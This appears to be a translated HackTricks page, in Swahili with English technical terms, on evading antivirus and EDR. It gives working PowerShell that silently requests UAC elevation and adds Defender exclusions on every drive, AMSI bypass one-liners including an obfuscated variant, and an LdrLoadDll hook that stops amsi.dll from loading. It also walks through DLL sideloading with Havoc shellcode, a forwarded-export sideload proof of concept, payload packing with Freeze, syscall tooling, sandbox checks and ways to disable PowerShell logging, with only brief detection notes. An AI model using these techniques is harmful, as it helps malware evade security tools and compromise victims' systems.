# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu ulianza kuandikwa na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zima Defender

- [defendnot](https://github.com/es3n1n/defendnot): Chombo cha kuzuia Windows Defender kufanya kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Chombo cha kuzuia Windows Defender kufanya kazi kwa kujifanya kuwa AV nyingine.
- [Zima Defender ikiwa wewe ni admin](basic-powershell-for-pentesters/README.md)

### Mtego wa UAC wa mtindo wa installer kabla ya kuingilia Defender

Loaders za umma zinazojifanya cheats za michezo mara nyingi hutolewa kama installers zisizotiwa saini za Node.js/Nexe ambazo kwanza **huomba mtumiaji idhini ya UAC** na kisha huizima Defender. Mtiririko ni rahisi:

1. Chunguza kama uko katika muktadha wa admin kwa kutumia `net session`. Amri inafanikiwa tu wakati mwito una admin rights, hivyo kushindwa kunaonyesha loader inaendeshwa kama standard user.
2. Inajirudia mara moja kwa kutumia kitendo cha `RunAs` ili kuchochea onyo la idhini la UAC lililotarajiwa huku ikihifadhi mstari wa amri wa asili.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Waathiriwa tayari wanaamini wanainstalisha “cracked” software, hivyo ombi kwa kawaida hukubaliwa, ukimpa malware haki unazohitaji kubadilisha sera ya Defender.

### Msamaha ya jumla ya `MpPreference` kwa kila herufi ya diski

Baada ya kupata hadhi ya juu, GachiLoader-style chains huongeza vidimbwi vya kugundua vya Defender badala ya kuzima huduma hiyo kabisa. loader kwanza huua GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) kisha inaweka **msamaha mpana sana** ili kila profaili ya mtumiaji, saraka ya mfumo, na diski inayoweza kuondolewa viwe visivyoweza kuchunguzwa:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Mambo muhimu:

- Mzunguko unapitia kila mfumo wa faili uliowekwa (D:\, E:\, USB sticks, etc.) hivyo **payload yoyote itakayodondoshwa baadaye mahali popote kwenye diski haitazingatiwa**.
- Uteuzi wa nyongeza `.sys` unaangalia mbele—washambuliaji wanahifadhi chaguo la kupakia unsigned drivers baadaye bila kugusa Defender tena.
- Mabadiliko yote yanaweka chini ya `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, kuruhusu hatua za baadaye kuthibitisha kwamba exclusions zinabaki au kuziongeza bila ku-re-trigger UAC.

Kwa kuwa hakuna huduma ya Defender iliyokwama, ukaguzi wa afya wa msingi unaendelea kuripoti “antivirus active” ingawa real-time inspection haigusi njia hizo.

## **AV Evasion Methodology**

Hivi sasa, AVs hutumia mbinu tofauti za kuangalia kama faili ni hatari au la, static detection, dynamic analysis, na kwa EDRs za hali ya juu, behavioural analysis.

### **Static detection**

Static detection inafikiwa kwa kuweka alama strings zilizo hatari au arrays za bytes katika binary au script, na pia kuchoma taarifa kutoka kwa faili yenyewe (mfano: file description, company name, digital signatures, icon, checksum, n.k.). Hii inamaanisha kwamba kutumia zana za umma zinazojulikana kunaweza kukufanya ugundulike kwa urahisi zaidi, kwani huenda zimetolewa uchambuzi na kuwekewa alama kama hatari. Kuna njia chache za kuepusha aina hii ya detection:

- **Encryption**

Ikiwa uta-encrypt binary, AV haitakuwa na namna ya kugundua programu yako, lakini utahitaji aina fulani ya loader ili ku-decrypt na kuendesha programu huko memory.

- **Obfuscation**

Wakati mwingine unachohitaji ni kubadilisha baadhi ya strings katika binary au script yako ili kupita AV, lakini hili linaweza kuchukua muda kulingana na kile unachojaribu obfuscate.

- **Custom tooling**

Ikiwa utatengeneza zana zako mwenyewe, hakutakuwa na signatures zilizojulikana kama mbaya, lakini hii inahitaji muda mwingi na juhudi.

> [!TIP]
> Njia nzuri ya kuangalia dhidi ya Windows Defender static detection ni ThreatCheck. Kwa msingi, inagawanya faili kuwa sehemu nyingi kisha inaagiza Defender iskanie kila sehemu kwa tofauti; kwa njia hii inaweza kukuambia hasa ni strings au bytes gani ziliwekwa alama katika binary yako.

Ninapendekeza sana uangalie [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) hii kuhusu practical AV Evasion.

### **Dynamic analysis**

Dynamic analysis ni wakati AV inaendesha binary yako katika sandbox na inatazama shughuli hatarishi (mfano: kujaribu ku-decrypt na kusoma nywila za browser, kufanya minidump kwenye LSASS, n.k.). Sehemu hii inaweza kuwa ngumu zaidi kushughulikia, lakini hapa kuna mambo unaweza kufanya kuepuka sandboxes.

- **Sleep before execution** Kulingana na jinsi ilivyotekelezwa, inaweza kuwa njia nzuri ya kupita dynamic analysis ya AV. AVs zina muda mfupi sana wa kuskana faili ili zisizovuruga mtiririko wa kazi wa mtumiaji, hivyo kutumia sleep ndefu kunaweza kuharibisha uchambuzi wa binaries. Tatizo ni kwamba sandboxes nyingi za AV zinaweza kuruka sleep kulingana na jinsi ilivyotekelezwa.
- **Checking machine's resources** Kwa kawaida Sandboxes zinakuwa na rasilimali chache (mfano: < 2GB RAM), vinginevyo zingeweza kupunguza utendaji wa mashine ya mtumiaji. Unaweza pia kuwa na ubunifu hapa, kwa mfano kwa kukagua joto la CPU au hata kasi za fan; si kila kitu kitatekelezwa katika sandbox.
- **Machine-specific checks** Ikiwa unataka kulenga mtumiaji ambaye workstation yake imejiunga na domain "contoso.local", unaweza kufanya uchunguzi wa domain ya kompyuta kuona kama inalingana na ile uliyobainisha; ikiwa haitalingani, unaweza kufanya programu yako itoke.

Imetajwa kuwa Microsoft Defender's Sandbox computername ni HAL9TH, hivyo, unaweza kukagua computer name katika malware yako kabla ya detonation; ikiwa jina linalingana na HAL9TH, inamaanisha uko ndani ya defender's sandbox, basi unaweza kufanya programu yako itoke.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>chanzo: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Vidokezo vingine nzuri kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) kuhusu kukabiliana na Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> chaneli ya #malware-dev</p></figcaption></figure>

Kama tulivyosema hapo awali, **public tools** hatimaye zitagundulika, kwa hiyo, unapaswa kuuliza mwenyewe jambo fulani:

Kwa mfano, ikiwa unataka dump LSASS, **je, kwa kweli unahitaji kutumia mimikatz**? Au unaweza kutumia mradi tofauti unaojulikana kidogo ambao pia hufanya dump ya LSASS.

Jibu sahihi labda ni hili la mwisho. Ukiuchukua mimikatz kama mfano, huenda ikawa moja ya, ikiwa siyo zaidi ya vipande vya malware vinavyoangaziwa na AVs na EDRs; mradi mwenyewe ni mzuri sana, lakini pia ni taabu kuutumia kuzunguka AVs, hivyo tafuta mbadala kwa kile unachojaribu kufanikisha.

> [!TIP]
> Unapobadilisha payloads zako kwa ajili ya evasion, hakikisha ku-**turn off automatic sample submission** katika defender, na tafadhali, kwa uzito, **DO NOT UPLOAD TO VIRUSTOTAL** ikiwa lengo lako ni kufanikiwa kuepuka kwa muda mrefu. Ikiwa unataka kuangalia kama payload yako inagunduliwa na AV fulani, iweke kwenye VM, jaribu kuzima automatic sample submission, na itest hapo mpaka utakapokuwa na matokeo unayoridhika nayo.

## EXEs vs DLLs

Kadiri inavyowezekana, kila mara **prioritize using DLLs for evasion**, kwa uzoefu wangu, faili za DLL kawaida huwa **haziugunduki kwa wingi** na kusomwa, hivyo ni mbinu rahisi kwa kuepuka detection katika baadhi ya kesi (ikiwa payload yako ina njia ya kukimbia kama DLL bila shaka).

Kama tunaona katika picha hii, DLL Payload kutoka Havoc ina detection rate ya 4/26 kwenye antiscan.me, wakati EXE payload ina 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Sasa tutaonyesha trick chache unazoweza kutumia na faili za DLL kuwa mnato zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** inatumia utaratibu wa kutafuta DLL unaotumika na loader kwa kuweka programu ya mwathiriwa na malicious payload(s) karibu kabisa kati yao.

Unaweza kuangalia programu zinazoweza kuathiriwa na DLL Sideloading kwa kutumia Siofra na powershell script ifuatayo:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Amri hii itaonyesha orodha ya programu zinazoweza kuathiriwa na DLL hijacking ndani ya "C:\Program Files\\" na faili za DLL wanazojaribu kupakia.

Ninapendekeza sana **explore DLL Hijackable/Sideloadable programs yourself**, njia hii ni ya siri ikiwa imetumika ipasavyo, lakini ukitumia programu za DLL Sideloadable zinazojulikana hadharani, unaweza kushikwa kwa urahisi.

Kuweka tu DLL hasidi yenye jina ambalo programu inatarajia kupakia haitachoma payload yako, kwa sababu programu inatarajia kazi maalum ndani ya DLL hiyo; ili kurekebisha tatizo hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** inapeleka miito ambayo programu inafanya kutoka kwa proxy (na DLL ya hasidi) hadi DLL ya asili, hivyo ikihifadhi utendaji wa programu na kuwa na uwezo wa kushughulikia utekelezaji wa payload yako.

Nitakuwa nikitumia mradi wa [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Hizi ndizo hatua nilizofuata:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Amri ya mwisho itatupa faili 2: kiolezo la chanzo la DLL, na DLL asili iliyopewa jina jipya.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ninapendekeza **kwa dhati** uangalie [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) ili ujifunze zaidi kuhusu yale tuliyoyajadili kwa undani.

### Kutumia Vibaya Forwarded Exports (ForwardSideLoading)

Windows PE modules zinaweza ku-export functions ambazo kwa kweli ni "forwarders": badala ya kuonyesha kwa code, entry ya export ina ASCII string ya muundo `TargetDll.TargetFunc`. Wakati caller anaposuluhisha export, Windows loader itafanya:

- Pakia `TargetDll` ikiwa haijapakiwa tayari
- Suluhisha `TargetFunc` kutoka kwake

Tabia muhimu za kuelewa:
- Ikiwa `TargetDll` ni KnownDLL, hutolewa kutoka kwa namespace iliyolindwa ya KnownDLLs (mf., ntdll, kernelbase, ole32).
- Ikiwa `TargetDll` si KnownDLL, utaratibu wa kawaida wa kutafuta DLL unatumika, ambao unajumuisha directory ya module inayofanya forward resolution.

Hii inaruhusu mbinu ya msingi ya sideloading isiyo ya moja kwa moja: tafuta signed DLL inayotoa export ya function iliyoforward kwenda kwa module name isiyo KnownDLL, kisha weka signed DLL hiyo katika directory moja pamoja na attacker-controlled DLL yenye jina sawa kabisa na forwarded target module. Wakati forwarded export inapoitekwa, loader itasuluhisha forward na kupakia DLL yako kutoka directory ile ile, ikitekeleza DllMain yako.

Mfano ulioonekana kwenye Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` sio KnownDLL, kwa hivyo hutatuliwa kupitia mpangilio wa kawaida wa utafutaji.

PoC (copy-paste):
1) Nakili DLL ya mfumo iliyotiwa saini kwenye folda inayoweza kuandikwa
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` yenye madhara katika folda ile ile. DllMain ndogo inatosha kupata utekelezaji wa msimbo; huna haja ya kutekeleza forwarded function ili kusababisha DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Chochea forward kwa kutumia LOLBin iliyosainiwa:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Tabia iliyogunduliwa:
- rundll32 (iliyosainiwa) inapakia side-by-side `keyiso.dll` (iliyosainiwa)
- Wakati ikitatua `KeyIsoSetAuditingInterface`, loader inafuata forward hadi `NCRYPTPROV.SetAuditingInterface`
- Kisha loader inapakia `NCRYPTPROV.dll` kutoka `C:\test` na inatekeleza `DllMain` yake
- Ikiwa `SetAuditingInterface` haijatimizwa, utapata hitilafu "missing API" tu baada ya `DllMain` tayari kuendesha

Vidokezo vya kuwinda:
- Zingatia forwarded exports ambapo module lengwa sio KnownDLL. KnownDLLs zimeorodheshwa chini ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuorodhesha forwarded exports kwa zana kama:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Tazama Windows 11 forwarder inventory kutafuta wagombea: https://hexacorn.com/d/apis_fwd.txt

Mapendekezo ya utambuzi/utetezi:
- Monitor LOLBins (e.g., rundll32.exe) loading signed DLLs from non-system paths, followed by loading non-KnownDLLs with the same base name from that directory
- Weka onyo kwa mnyororo wa mchakato/moduli kama: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` chini ya njia zinazoweza kuandikwa na mtumiaji
- Lazimisha sera za uadilifu wa msimbo (WDAC/AppLocker) na kata ruhusa ya kuandika+kutekeleza katika saraka za programu

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia ya siri.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ni mchezo wa paka na panya; kile kinachofanya kazi leo kinaweza kugunduliwa kesho, kwa hivyo usitegemee chombo kimoja tu — inapowezekana, jaribu kuunganisha multiple evasion techniques.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs mara nyingi huweka **user-mode inline hooks** kwenye `ntdll.dll` syscall stubs. Ili kupitisha hooks hizo, unaweza kuunda **direct** au **indirect** syscall stubs ambazo zinapakia **SSN** (System Service Number) sahihi na kutamia kernel mode bila kutekeleza hooked export entrypoint.

**Invocation options:**
- **Direct (embedded)**: emit a `syscall`/`sysenter`/`SVC #0` instruction in the generated stub (no `ntdll` export hit).
- **Indirect**: jump into an existing `syscall` gadget inside `ntdll` so the kernel transition appears to originate from `ntdll` (useful for heuristic evasion); **randomized indirect** picks a gadget from a pool per call.
- **Egg-hunt**: avoid embedding the static `0F 05` opcode sequence on disk; resolve a syscall sequence at runtime.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: infer SSNs by sorting syscall stubs by virtual address instead of reading stub bytes.
- **SyscallsFromDisk**: map a clean `\KnownDlls\ntdll.dll`, read SSNs from its `.text`, then unmap (bypasses all in-memory hooks).
- **RecycledGate**: combine VA-sorted SSN inference with opcode validation when a stub is clean; fall back to VA inference if hooked.
- **HW Breakpoint**: set DR0 on the `syscall` instruction and use a VEH to capture the SSN from `EAX` at runtime, without parsing hooked bytes.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI ilianzishwa kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Mwanzo, AVs zingeweza kuchunguza tu **files on disk**, hivyo ikiwa unaweza kwa namna fulani kutekeleza payloads **directly in-memory**, AV haikuwa na uwezo wa kuzuia, kwani haikuwa na mwonekano wa kutosha.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (kupandishwa kwa ruhusa kwa EXE, COM, MSI, au ufungaji wa ActiveX)
- PowerShell (scripts, matumizi ya interactive, na dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Inaruhusu antivirus solutions kuchunguza tabia ya script kwa kuonyesha yaliyomo ya script katika fomu ambayo si iliyofichwa wala kuzirudisha.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` itasababisha alert ifuatayo kwenye Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Angalia jinsi inavyoanzisha `amsi:` kabla ya njia ya executable kutoka ambayo script ilitekelezwa, katika kesi hii, powershell.exe

Sisi hatukutupa faili yoyote kwenye diski, lakini bado tulikamatwa tayari kwenye in-memory kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia na **.NET 4.8**, C# code inapitia AMSI pia. Hii hata inaathiri `Assembly.Load(byte[])` kwa kusababisha in-memory execution. Ndiyo maana kutumia matoleo ya chini ya .NET (kama 4.7.2 au chini) kunapendekezwa kwa in-memory execution ikiwa unataka kuepuka AMSI.

Kuna njia chache za kuepuka AMSI:

- **Obfuscation**

Kwa kuwa AMSI inafanya kazi hasa na detections za static, hivyo, kubadilisha scripts unazojaribu kupakia inaweza kuwa njia nzuri ya kuepuka detection.

Hata hivyo, AMSI ina uwezo wa unobfuscating scripts hata kama zina safu nyingi, hivyo obfuscation inaweza isiwe chaguo zuri kulingana na jinsi inavyofanywa. Hii inafanya isiwe rahisi kuepuka. Ingawa, wakati mwingine, kila unachohitaji ni kubadilisha majina ya vigezo vichache na utakuwa sawa, hivyo inategemea jinsi kitu kilivyoangaziwa.

- **AMSI Bypass**

Kwa kuwa AMSI imeimplemented kwa kupakia DLL ndani ya mchakato wa powershell (pia cscript.exe, wscript.exe, n.k.), inawezekana kuharibu au kubadilisha kwa urahisi hata ukiendesha kama mtumiaji asiye na ruhusa. Kutokana na kasoro hii katika utekelezaji wa AMSI, watafiti wamegundua njia nyingi za kuepuka AMSI scanning.

**Forcing an Error**

Kusababisha AMSI initialization kushindwa (amsiInitFailed) kutasababisha hakuna scan itakayozinduliwa kwa mchakato wa sasa. Hii ilifichuliwa awali na [Matt Graeber](https://twitter.com/mattifestation) na Microsoft imeunda signature ili kuzuia matumizi mapana.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Kilichohitajika ilikuwa mstari mmoja wa msimbo wa powershell kufanya AMSI isitumike kwa mchakato wa powershell wa sasa. Mstari huu, bila shaka, umetambulika na AMSI yenyewe, hivyo marekebisho fulani yanahitajika ili kutumia mbinu hii.

Hapa kuna AMSI bypass iliyorekebishwa niliyoichukua kutoka kwenye [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Kumbuka, hii inaweza kufichuliwa mara tu chapisho hili linapochapishwa, kwa hivyo haupaswi kuchapisha code yoyote ikiwa mpango wako ni kubaki bila kugunduliwa.

Memory Patching

Teknika hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kupata anwani ya kazi ya "AmsiScanBuffer" katika amsi.dll (inayehusika na kuchunguza input iliyotolewa na mtumiaji) na kuibandika kwa maagizo yanayorejesha code ya E_INVALIDARG; kwa hivyo, matokeo ya skani halisi yatarudisha 0, ambayo hufasiriwa kama matokeo safi.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo ya kina.

Kuna mbinu nyingi nyingine pia zinazotumika kupita AMSI kwa powershell, angalia [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) ili kujifunza zaidi kuhusu hizo.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI inaanzishwa tu baada ya `amsi.dll` kupakiwa katika mchakato wa sasa. Mbinu imara, isiyotegemea lugha, ya bypass ni kuweka user‑mode hook kwenye `ntdll!LdrLoadDll` ambayo inarudisha error wakati module inayohitajika ni `amsi.dll`. Matokeo yake, AMSI haitapakiwa na hakuna skani zitakazofanyika kwa mchakato huo.

Muhtasari wa utekelezaji (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Vidokezo
- Inafanya kazi kwenye PowerShell, WScript/CScript na custom loaders pia (kitu chochote ambacho vinginevyo kingepakia AMSI).
- Unganisha na kutoa scripts kupitia stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ili kuepuka vionjo virefu vya command‑line.
- Imeonekana ikitumika na loaders zinazotekelezwa kupitia LOLBins (mfano, `regsvr32` ikaita `DllRegisterServer`).

Zana **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** pia inazalisha script za bypass AMSI.
Zana **[https://amsibypass.com/](https://amsibypass.com/)** pia inazalisha script za bypass AMSI ambazo zinaepuka signature kwa kutumia randomized user-defined functions, variables, character expressions na zinaweka random character casing kwa PowerShell keywords ili kuepuka signature.

**Ondoa signature iliyotambuliwa**

Unaweza kutumia zana kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** kuondoa AMSI signature iliyotambuliwa kutoka memory ya current process. Zana hizi zinafanya kazi kwa kuchunguza memory ya current process kwa ajili ya AMSI signature na kisha kuibadilisha na NOP instructions, kwa ufanisi kuiondoa kutoka memory.

**AV/EDR products that uses AMSI**

Unaweza kupata orodha ya AV/EDR products zinazotumia AMSI katika **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Ikiwa unatumia PowerShell version 2, AMSI haitapakiwa, kwa hivyo unaweza kuendesha scripts zako bila kuskanwa na AMSI. Unaweza kufanya hivi:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging ni kipengele kinachokuwezesha kuandika kumbukumbu za amri zote za PowerShell zinazotekelezwa kwenye mfumo. Hii inaweza kusaidia kwa ukaguzi (auditing) na kutatua matatizo, lakini pia inaweza kuwa tatizo kwa wadukuzi wanaotaka kuepuka kugunduliwa.

Ili kupita PowerShell logging, unaweza kutumia mbinu zifuatazo:

- **Disable PowerShell Transcription and Module Logging**: Unaweza kutumia zana kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa ajili ya kusudi hili.
- **Use Powershell version 2**: Ikiwa utatumia PowerShell version 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kukaguliwa na AMSI. Unaweza kufanya hivyo: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Tumia [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kuanzisha PowerShell isiyosimamiwa bila kinga (hii ndio `powerpick` kutoka Cobal Strike inayotumia).


## Obfuscation

> [!TIP]
> Mbinu kadhaa za obfuscation zinategemea encrypting data, jambo linaloongeza entropy ya binary na kufanya iwe rahisi kwa AVs na EDRs kuigundua. Kuwa makini na hili na labda tumia encryption tu kwa sehemu maalum za code yako ambazo ni nyeti au zinahitaji kufichwa.

### Kuondoa obfuscation ya ConfuserEx-Protected .NET Binaries

Unapoichambua malware inayotumia ConfuserEx 2 (au forks za kibiashara) ni kawaida kukutana na tabaka kadhaa za ulinzi zitakazozuia decompilers na sandboxes. Mtiririko wa kazi ufuatao urejesha kwa kuaminika IL karibu-na-asili ambayo baadaye inaweza ku-decompile-kwa C# kwa kutumia zana kama dnSpy au ILSpy.

1.  Kuondoa anti-tampering – ConfuserEx inasimbua kila *method body* na kui-decrypt ndani ya *module* static constructor (`<Module>.cctor`). Hii pia inabadilisha PE checksum hivyo mabadiliko yoyote yatafanya binary ifuse. Tumia **AntiTamperKiller** kutambua encrypted metadata tables, kurejesha XOR keys na kuandika tena assembly safi:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Matokeo yanajumuisha vigezo 6 vya anti-tamper (`key0-key3`, `nameHash`, `internKey`) ambavyo vinaweza kuwa muhimu wakati wa kujenga unpacker yako.

2.  Rejesha alama / control-flow – winga faili *safi* kwa **de4dot-cex** (fork ya de4dot inayotambua ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – chagua profile ya ConfuserEx 2  
• de4dot itaondoa control-flow flattening, iirejeshe namespaces za awali, classes na majina ya variables na ku-decrypt constant strings.

3.  Kuondoa proxy-call – ConfuserEx hubadilisha method calls za moja kwa moja kuwa wrappers za nyepesi (a.k.a *proxy calls*) kuzidi kuvuruga decompilation. Ziondoe kwa kutumia **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Baada ya hatua hii utapaswa kuona API za kawaida za .NET kama `Convert.FromBase64String` au `AES.Create()` badala ya functions za wrapper zisizoeleweka (`Class8.smethod_10`, …).

4.  Usafishaji wa mkono – endesha binary iliyopatikana chini ya dnSpy, tafuta Base64 blobs kubwa au matumizi ya `RijndaelManaged`/`TripleDESCryptoServiceProvider` ili kupata payload halisi. Mara nyingi malware huhifadhi kama TLV-encoded byte array iliyowekwa ndani ya `<Module>.byte_0`.

Mnyororo hapo juu urejesha mtiririko wa utekelezaji bila kuhitaji kuendesha sample ya hatari – muhimu unapofanya kazi kwenye workstation isiyo na mtandao.

> 🛈  ConfuserEx hutengeneza attribute maalum lenye jina `ConfusedByAttribute` ambalo linaweza kutumika kama IOC kwa kutenganisha samples kiotomati.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

